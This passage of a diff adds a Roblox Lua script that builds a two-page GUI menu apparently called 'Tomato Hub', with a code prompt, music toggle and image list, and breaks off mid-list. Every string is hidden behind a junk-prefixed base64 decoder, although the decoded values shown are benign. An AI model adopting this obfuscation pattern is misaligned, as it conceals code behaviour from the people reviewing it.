@@ -1,0 +1,689 @@
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+
+ 
+
+
+
+-- Создаем локальную переменную для хранения игрока
+local player = game.Players.LocalPlayer
+
+-- Создаем локальную переменную для хранения графического интерфейса
+local gui = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('fvUoHLUAUSHBOikNehXTTVuLpWjXDDbJvUCTZGaBsdzqewKgIGnrAENU2NyZWVuR3Vp'), player.PlayerGui)
+
+-- Создаем локальную переменную для хранения фрейма меню
+local menu = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('nkmBFnOyptyDupJnJKSqzSMDHBuvbOwBRNWeRwhBoBjChkcfvbrFPHORnJhbWU='), gui)
+menu.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('tLgURZgUUqVwCtwgDweqAIaGQLfaxoQqeCQDfFdAhAQOnDCFSSJxCcTTWVudQ==')
+menu.Size = UDim2.new(0.7, 0, 0.8, 0)
+menu.Position = UDim2.new(0.15, 0, 0.08, 0)
+menu.BackgroundTransparency = 1
+menu.Draggable = true -- Включаем функцию перетаскивания
+
+-- После создания объекта NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('hpGxAeqYaYVniFMMDNaTkFmIoJEBdCXGWOaFLnZxYibzbBRIHhWyGqebWVudQ=='), но перед созданием кнопок:
+local backgroundImage = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('dhFhOniCMBjGudrPLKcfQtlIsSJEHQPeREcWHsrIKMXdJRpDYDFAYfrSW1hZ2VMYWJlbA=='))
+backgroundImage.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('PkyztGcMQNdLYnEJZSIRpeytnttmUImnKpZkrwsKypqIGpPKmJGGrUaQmFja2dyb3VuZEltYWdl')
+backgroundImage.Size = UDim2.new(1, 0, 1, 0) -- Занимает весь фрейм меню
+backgroundImage.Position = UDim2.new(0, 0, 0, 0)
+backgroundImage.Image = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('amOdDqGewpstrKNfTWlguUZhNfUJTyjUVhxvWCigNVGazOByrlEZkRJcmJ4YXNzZXRpZDovLzE2MjE4ODIzMTEz') -- Замените ваш_asset_id на актуальный AssetId изображения
+backgroundImage.ScaleType = Enum.ScaleType.Stretch -- Растягиваем изображение на весь фрейм
+backgroundImage.ZIndex = 1 -- Установите ZIndex меньше, чем у кнопок
+backgroundImage.Parent = menu -- Родительский элемент - это фрейм меню
+
+-- Делаем фон фрейма меню полностью прозрачным
+menu.BackgroundTransparency = 1
+
+
+-- Создаем локальную переменную для хранения заголовка меню
+local title = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('VtSjuIPwRJAMvolITVbHPajAcdTYmBhdNQQJFnwjcPGTLLAHyasqoxEVGV4dExhYmVs'), menu)
+title.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('qQkVLkEwHtieqSDRHZjvwNOyIEIMxQJUsAAAekdxSzASplhSyyeaatBVGl0bGU=')
+title.Size = UDim2.new(1, 0, 0.1, 0)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundColor3 = Color3.new(0, 0, 0)
+title.BackgroundTransparency = 0.5
+title.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('qIQkUGqEHBgqWiyYacYaCdQfGJrUArzUllHJujLuvnZMPgHFVQKtMGq8J+NhSBUb21hdG8gSHViIPCfjYU=')
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextScaled = true
+title.Font = Enum.Font.SourceSansBold
+
+-- Создаем локальную переменную для хранения кнопки закрытия меню
+local closeButton = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('esVfUzJaqOvUzargGkGXrdFkbmVjRgmMRdlAPqWirZfPkaPvqFWxaTUVGV4dEJ1dHRvbg=='), menu)
+closeButton.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('UIOxdkKhTTwpoaxXQMMkXQXXCyLVWjQRouzXzqbIAVlydGNyPhKvuKMQ2xvc2VCdXR0b24=')
+closeButton.Size = UDim2.new(0.1, 0, 0.1, 0)
+closeButton.Position = UDim2.new(0.9, 0, 0, 0)
+closeButton.BackgroundColor3 = Color3.new(1, 0, 0)
+closeButton.BackgroundTransparency = 0.5
+closeButton.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('SgjDeRmXrubHiwTXyuXNrBoHAQrmjsIHgyjDdURMMQXdWVKFOokXRLQ0KU=')
+closeButton.TextColor3 = Color3.new(1, 1, 1)
+closeButton.TextScaled = true
+closeButton.Font = Enum.Font.SourceSansBold
+
+-- Предположим, что closeButton — это кнопка закрытия на первой странице
+closeButton.MouseButton1Click:Connect(function()
+    menu.Visible = false -- Скрываем только первую страницу
+end)
+
+
+-- Создаем локальную переменную для хранения кнопки сворачивания меню
+local minimizeButton = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('JMXdxsvBDhHcjtDSDrYtidylnUwipXLbmwMXYfaqindQTUFXTNnMqjyVGV4dEJ1dHRvbg=='), menu)
+minimizeButton.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('AXTszhPnrflAuaTkxerdqIdvibXPFCwClbGppykrwHTYsoiaqwgYobTTWluaW1pemVCdXR0b24=')
+minimizeButton.Size = UDim2.new(0.1, 0, 0.1, 0)
+minimizeButton.Position = UDim2.new(0.8, 0, 0, 0) -- Сдвигаем налево относительно кнопки закрытия
+minimizeButton.BackgroundColor3 = Color3.new(0, 0, 1)
+minimizeButton.BackgroundTransparency = 0.5
+minimizeButton.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('cLeIyNUbiHHDRDyCYbAmMjBImZrKrDOmQDBFizMahcqHuRtWmNUmNdf4oCT')
+minimizeButton.TextColor3 = Color3.new(1, 1, 1)
+minimizeButton.TextScaled = true
+minimizeButton.Font = Enum.Font.SourceSansBold
+
+-- Создаем локальную переменную для хранения кнопки разворачивания меню
+local expandButton = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('TWoKlbRWiHCVpzECOGZNRrxjVIUdwZGQJwtaDFgpwveElEdYoRNQmtlVGV4dEJ1dHRvbg=='), gui)
+expandButton.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('EZADBrvPmmRkeUqHjqfVhMpzzReWAPYdKKKdNETYjCdRVyDLdIjlfsFRXhwYW5kQnV0dG9u')
+expandButton.Size = UDim2.new(0.1, 0, 0.1, 0)
+expandButton.Position = UDim2.new(0.1, 0, 0.1, 0) -- Позиция на экране
+expandButton.BackgroundColor3 = Color3.new(0, 0, 0)
+expandButton.BackgroundTransparency = 0.5
+expandButton.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('YuZUlOhjMQavcuGDzynmuyGyssOYtkiTcCXsbaPAxQGBdaguvshHXqTKw==')
+expandButton.TextColor3 = Color3.new(1, 1, 1)
+expandButton.TextScaled = true
+expandButton.Font = Enum.Font.SourceSansBold
+expandButton.Visible = false -- Сначала кнопка невидима
+
+-- Функция для сворачивания меню
+minimizeButton.MouseButton1Click:Connect(function()
+    menu.Visible = false
+    expandButton.Visible = true
+end)
+
+-- Функция для разворачивания меню
+expandButton.MouseButton1Click:Connect(function()
+    menu.Visible = true
+    expandButton.Visible = false
+end)
+
+-- Предполагаем, что весь предыдущий код остается без изменений
+
+-- Создаем вторую страницу меню
+local secondPage = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('pVZowVBQqXiVYccTREBSGPjWBIwXAOWeYhYKkQXNtvIiGVJOXgOydkNRnJhbWU='), gui)
+secondPage.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('TfBgUNOqrMyLMfICpuzNZiYGYPYlziwgvETFhHyQUvkxXUevBBonuenU2Vjb25kUGFnZQ==')
+secondPage.Size = UDim2.new(0.7, 0, 0.8, 0)
+secondPage.Position = UDim2.new(0.15, 0, 0.08, 0)
+secondPage.BackgroundTransparency = 1
+secondPage.Visible = false -- Изначально скрыта
+
+-- Добавляем фон, аналогичный первой странице
+local secondPageBackground = backgroundImage:Clone()
+secondPageBackground.Parent = secondPage
+
+-- Создаем кнопку для перехода на вторую страницу
+local nextPageButton = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('fDtNcubVNakRAMxxfetSedXmoktXJKLflGzZLEHJnxJyhWtdlBbCEzgVGV4dEJ1dHRvbg=='), menu)
+nextPageButton.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('eXHTVbdplMsqxmgssbPhETWvahgnjjiEZOJblCJFkVIlXymkewidopFTmV4dFBhZ2VCdXR0b24=')
+nextPageButton.Size = UDim2.new(0.1, 0, 0.1, 0)
+nextPageButton.Position = UDim2.new(0, 0, 0.9, 0) -- В левом нижнем углу
+nextPageButton.BackgroundColor3 = Color3.new(0, 0, 0)
+nextPageButton.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('FpwVbshBCKxOOyDhZeAfLQKcGaznkoXTSsRTslaghHhmBUZAXAhznNbPg==')
+nextPageButton.TextColor3 = Color3.new(1, 1, 1)
+nextPageButton.Font = Enum.Font.SourceSansBold
+nextPageButton.TextScaled = true
+
+-- Создаем маленькое меню для ввода кода
+local codeInputMenu = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('uXyQYyfkrxWYZDNEiSGgabSTiJCFJfpFWBsNbXuRGwEjRqwkniWTNQGRnJhbWU='), gui)
+codeInputMenu.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('sZZfGEqWFoJHgNLUrbNutKgjtQdnZqIfHpIUpgfQYDQrwCbUBRvGhwMQ29kZUlucHV0TWVudQ==')
+codeInputMenu.Size = UDim2.new(0.2, 0, 0.2, 0)
+codeInputMenu.Position = UDim2.new(0.4, 0, 0.4, 0)
+codeInputMenu.BackgroundColor3 = Color3.new(0, 0, 0)
+codeInputMenu.Visible = false -- Изначально скрыто
+
+-- closeButton в этом контексте — это кнопка закрытия в меню ввода кода
+local closeButtonCodeMenu = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('gsShSuqMboIgDCcOVSWVWoaTwmLwbtjmMewvMSQtlMgPAXLsWkjLdvvVGV4dEJ1dHRvbg=='), codeInputMenu) -- Убедитесь, что создаете кнопку в правильном родительском элементе
+closeButtonCodeMenu.Size = UDim2.new(0.2, 0, 0.2, 0)
+closeButtonCodeMenu.Position = UDim2.new(0.8, 0, 0, 0) -- В правом верхнем углу маленького меню
+closeButtonCodeMenu.BackgroundColor3 = Color3.new(1, 0, 0)
+closeButtonCodeMenu.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('DvWBJKNmjhQgKHXceARLtukcMFXTsGAReMiZoOAtHBYttsXzcuQMHuiWA==')
+closeButtonCodeMenu.TextColor3 = Color3.new(1, 1, 1)
+closeButtonCodeMenu.Font = Enum.Font.SourceSansBold
+closeButtonCodeMenu.TextScaled = true
+
+-- Обработчик нажатия на крестик маленького меню
+closeButtonCodeMenu.MouseButton1Click:Connect(function()
+    codeInputMenu.Visible = false -- Скрываем только маленькое меню ввода кода
+end)
+
+
+-- Поле для ввода кода
+local codeInput = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('nQmdMdgNLstpOgMtMGVlYWLMJgNdvurffyWhPqXsZwyoHrQeuMwsXQCVGV4dEJveA=='), codeInputMenu)
+codeInput.Size = UDim2.new(0.8, 0, 0.6, 0)
+codeInput.Position = UDim2.new(0.1, 0, 0.2, 0)
+codeInput.BackgroundColor3 = Color3.new(1, 1, 1)
+codeInput.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('JZfQMKmsvnHDhdpajPRqHySorZinkKqSjwHFZIyONnzHEIIPzmgLgza')
+codeInput.Font = Enum.Font.SourceSans
+codeInput.TextScaled = true
+
+-- Логика открытия и закрытия меню кода
+nextPageButton.MouseButton1Click:Connect(function()
+    codeInputMenu.Visible = true
+end)
+
+closeButton.MouseButton1Click:Connect(function()
+    codeInputMenu.Visible = false
+end)
+
+-- Проверка кода и переход на вторую страницу
+codeInput.FocusLost:Connect(function(enterPressed)
+    if enterPressed and codeInput.Text == NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('kJMJawBdnlnxyhjmoeoskJNEnzKEhOBoycjvoXdxfdczUFCsCDskHZuMTIz') then
+        menu.Visible = false
+        secondPage.Visible = true
+        codeInputMenu.Visible = false
+    else
+        codeInput.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('xCQOBuXQuvTxGQWDOhEeTScWUthbzsUTVPHtFFXzjjUZBJlpdJzeJCwSU5DT1JSRUNUIENPREU=')
+    end
+end)
+
+-- Создаем объект ImageLabel для фона второй страницы с другим изображением
+local secondPageBackgroundImage = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('fwaDQQCFRjSvQGxDzIGHIJsCOeTsJSgXgclMONZdViMPyjPaoakLTXASW1hZ2VMYWJlbA=='))
+secondPageBackgroundImage.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('FlGvMojiWrtwJkuegjoRgTVuRAOdkhvleCUqeRLBcUaOHYXPoKviyawQmFja2dyb3VuZEltYWdl')
+secondPageBackgroundImage.Size = UDim2.new(1, 0, 1, 0) -- Занимает весь фрейм второй страницы
+secondPageBackgroundImage.Position = UDim2.new(0, 0, 0, 0)
+secondPageBackgroundImage.Image = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('vVPgnaSKsLzAZgjiZKJlWLCZlkzOnoIkBkCDGBiYhpuMGmgaJLMaykDcmJ4YXNzZXRpZDovLzE2MjUyNTU4MTUz') -- Замените на новый AssetId изображения
+secondPageBackgroundImage.ScaleType = Enum.ScaleType.Stretch -- Растягиваем изображение на весь фрейм
+secondPageBackgroundImage.ZIndex = 1 -- Установите ZIndex меньше, чем у кнопок
+secondPageBackgroundImage.Parent = secondPage -- Родительский элемент - это фрейм второй страницы
+
+-- Делаем фон фрейма второй страницы полностью прозрачным
+secondPage.BackgroundTransparency = 1
+
+
+
+-- Кнопка возврата на первую страницу
+local previousPageButton = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('qTOeZMesOURghfuaXZwdGgjfWdlJhDqzUxaWxRZMiRWXoIvbiTXwhABVGV4dEJ1dHRvbg=='), secondPage)
+previousPageButton.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('mAALSiYqvpqukpbtZCjHtlcoCyMzcdntlrjsCUPNUnJaUIToWpvRLeUUHJldmlvdXNQYWdlQnV0dG9u')
+previousPageButton.Size = UDim2.new(0.1, 0, 0.1, 0)
+previousPageButton.Position = UDim2.new(0, 0, 0.9, 0) -- В левом нижнем углу
+previousPageButton.BackgroundColor3 = Color3.new(0, 0, 0)
+previousPageButton.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('kVvwgdOJoVNZnSDaqoSOWSTVmCiXHSJZGZshENBJEVkrExvVxzwKrzkPA==')
+previousPageButton.TextColor3 = Color3.new(1, 1, 1)
+previousPageButton.Font = Enum.Font.SourceSansBold
+previousPageButton.TextScaled = true
+
+previousPageButton.MouseButton1Click:Connect(function()
+    secondPage.Visible = false
+    menu.Visible = true
+end)
+
+-- Добавляем объект Sound для воспроизведения музыки
+local music = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('aPvCHPuPYUWkfWazNDaFGsHtvXrbofCpOlkoTqNYTvfWyqAVQPBiWOvU291bmQ='), secondPage)
+music.SoundId = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('SdxCMvXwGkBbieyAJhUyhWRkqvqlJHxVPuMKjVDIcGfWDpMPydgvJkGcmJ4YXNzZXRpZDovLzU0MTAwODA4NTc=') -- Замените на ваш айди музыки
+music.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('OxhKngXGQJFvhjSqHzThRqhAztUAdyJSwduIfMIFsPiFjKIoNBQprkzQmFja2dyb3VuZE11c2lj')
+music.Looped = true -- Музыка будет зациклена
+
+-- Создаем кнопку воспроизведения/остановки музыки на второй странице
+local playButton = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('SABycVnPIyEmYvAgvixNuwADNxTvkyIFjkJlIoDtFAMoifNQtaBEZlXVGV4dEJ1dHRvbg=='), secondPage)
+playButton.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('RSqFGAgwaJFOtSrnTZFeqLMmiWIRjQzddIGhcAbCzpszMqTizncUhbEUGxheUJ1dHRvbg==')
+playButton.Size = UDim2.new(0.2, 0, 0.1, 0) -- Размер кнопки
+playButton.Position = UDim2.new(0.4, 0, 0.45, 0) -- Позиция кнопки по центру страницы
+playButton.BackgroundColor3 = Color3.new(1, 0, 0) -- Красный фон кнопки
+playButton.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('JBCmWOpRJzhpzHSUDorbGJocoetVCkHerYXTDkprdvPnXwcUtdsFjQvU1RBUlQg4oqZ4oGg77mP4oGg4oqZ') -- Начальный текст кнопки
+playButton.TextColor3 = Color3.new(1, 1, 1)
+playButton.Font = Enum.Font.SourceSansBold
+playButton.TextScaled = true
+
+-- Создаем текст NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('ltsoGLjUBfQXPWYUYxhzWBfAYcgxRMopMSkZpjBQuJRtwpAJqtYdKwrRlJFRSBNUDMhIDoz') сверху кнопки
+local freeMp3Text = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('pMPLGMAPVVKszhyVvcBHrEOZkIDyJZGwjvJsbClSKydsxhLnXxZqKrcVGV4dExhYmVs'), secondPage)
+freeMp3Text.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('TDXOnwKTMALTznHtshXRczUIsJQtZrcLIOdawbGtexHCYkOddwSNnvxRnJlZU1wM1RleHQ=')
+freeMp3Text.Size = UDim2.new(0.2, 0, 0.09, 0) -- Размер текста
+freeMp3Text.Position = UDim2.new(0.4, 0, 0.55, 0) -- Позиция текста над кнопкой
+freeMp3Text.BackgroundColor3 = Color3.new(1, 1, 0) -- Желтый фон текста
+freeMp3Text.BackgroundTransparency = 1 -- Прозрачный фон
+freeMp3Text.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('laRfsqmQLTCdNrsIwCGVsPcyZAOSnZjYfrLRiSJOWCAqtPjlqnfvYrNRlJFRSBNUDMhIDoz')
+freeMp3Text.TextColor3 = Color3.new(1, 1, 0) -- Желтый цвет текста
+freeMp3Text.Font = Enum.Font.SourceSansBold
+freeMp3Text.TextScaled = true
+
+-- Функция переключения музыки
+local function toggleMusic()
+    if music.Playing then
+        music:Stop()
+        playButton.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('rziOXrfdQlzaTkTHcgagueuQaoZMyyBRIWjIWYkrropTPXuLgHbOmLgU1RBUlQg4oqZ4oGg77mP4oGg4oqZ') -- Текст кнопки, когда музыка остановлена
+    else
+        music:Play()
+        playButton.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('yXKIENWYIMXzrErqGhSwahsqdGThmrdMsrBsGMwZJvJXsLIUNPIirRa4pa2') -- Текст кнопки, когда музыка играет
+    end
+end
+
+
+-- Список идентификаторов изображений для анимации
+local imageIds = {
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('LechJyklYvxJsalSRYkeQKDXpoKYzJyQUwIiElsmDoYSvrVOECACHgMcmJ4YXNzZXRpZDovLzE2MjU4NjUxMjI5'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('THscunYxboSbQHIcdhRkToWMweUtxQHwNTnqJWAMiAghssMEuknNSYWcmJ4YXNzZXRpZDovLzE2MjU4NjU0MjU5'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('hNFhFrAEIbEEwZYPUtwNYAynECxvBFArHwGtPMCwAGYhzwDBRsZwXSEcmJ4YXNzZXRpZDovLzE2MjU4NjU1ODU5'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('RQvFETjXpxDEnlmTEGtsCBYaEYhQPUIFskxTOGOCJdaCaOElROhKfoucmJ4YXNzZXRpZDovLzE2MjU4NjU3NDkx'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('CpGnFywqNzMmYSOrKNMCJVqraCjvjlUeMiRvWaPeeWERbBobRyrokvNcmJ4YXNzZXRpZDovLzE2MjU4NjYwNTUy'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('NVLnCQDKcioIHusBFMYANIkDPhgeLFYgzsbuuiQvQOWykxdKbmbhhjOcmJ4YXNzZXRpZDovLzE2MjU4NjcxMzk2'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('FEsMAzFQZbZQnnpVOIbxQcnErUDEVnEavqCGWYMjNSNkdslmjVVOUmicmJ4YXNzZXRpZDovLzE2MjU4NjcyOTE1'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('DANEyANwhiwDFiBpLfhRZTyWgWvZtzUrSsgMCUbnmZCKwqCcmCjqFnHcmJ4YXNzZXRpZDovLzE2MjU4Njc0NTk2'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('DBiDiczrhiXAyXWjyTCWflrqkaVNDtWuiHWoyuoObmcXUFvIRNMUeLMcmJ4YXNzZXRpZDovLzE2MjU4Njc2NDky'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('TSEpYidkDcRDcJsRZFsEnpHZwprtQlZgxafeoFpQHPfbeCTXpuanUETcmJ4YXNzZXRpZDovLzE2MjU4Njc4MDg1'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('gqmHjdkprmxPemkDbgNAwzOMNRDBRLClzSEhEjaQWnJOzRLsIBtlyvAcmJ4YXNzZXRpZDovLzE2MjU4Njg4NzE0'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('inOFxxIQrSJBGrzOSheQqfKjZGGqqVaZToCztrozDRZCzsBLJeIEFImcmJ4YXNzZXRpZDovLzE2MjU4Njg5OTcx'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('DROlfEUIFHxvGnABOQFTEfKfJqOVtgPHAXJKSGEZjLfUEPZYNXjMFsHcmJ4YXNzZXRpZDovLzE2MjU4NjkxMzYy'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('uANnONgsWXpPbngTATIMDwHaCJCMTKjfwazjZYejXCjJYJUpUUxRxYkcmJ4YXNzZXRpZDovLzE2MjU4NjkzMDE5'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('NYxIqSNMFqBhcDDerIkXGXXHvVeVDnHGShEOgDRPQommMFGYWGQVdDNcmJ4YXNzZXRpZDovLzE2MjU4Njk0NjAz'), 
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('qKZYyGVhpRFbpcaOSaptRJNmunWsmCwxahqGUonPdxuuYSwSRpMhedDcmJ4YXNzZXRpZDovLzE2MjU4NzA2NjI5'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('MbJxMiCNTBNnlewFTWOoQWbTYFQxWoxbCHQItUZRDcSwBfnpxsqKpZZcmJ4YXNzZXRpZDovLzE2MjU4NzA4MTcw'),
+    NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('PLUIczkAmkVRvMLaUaNQcWJtMGOxIhDcauPAQtaolxpjibJdajWALuScmJ4YXNzZXRpZDovLzE2MjU4NzA5ODIw'),
